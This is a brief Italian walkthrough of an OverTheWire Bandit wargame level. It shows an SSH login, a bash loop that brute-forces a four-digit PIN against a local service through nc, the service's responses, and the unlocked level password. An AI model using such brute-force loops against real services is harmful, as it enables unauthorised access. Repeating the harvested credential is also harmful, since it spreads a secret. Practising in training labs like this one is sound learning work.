# Comandi usati:
	ssh
	cd
	for
	nc
	grep
# Procedura:
	ssh bandit24@bandit.labs.overthewire.org -p 2220
	cd /tmp
	for i in {0000..9999}; do echo "(password vecchia) $i"; done | nc localhost 
	30002
	return:
		Wrong! Please enter the correct current password and pincode. Try again. 
		Wrong! Please enter the correct current password and pincode. Try again. 
		Wrong! Please enter the correct current password and pincode. Try again.
		...
		Correct!
		(password)
	(con grep -vi "wrong|please" dopo nc con pipe avrei mostrato solamente le 
	righe giuste)
# Password sbloccata:
	SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P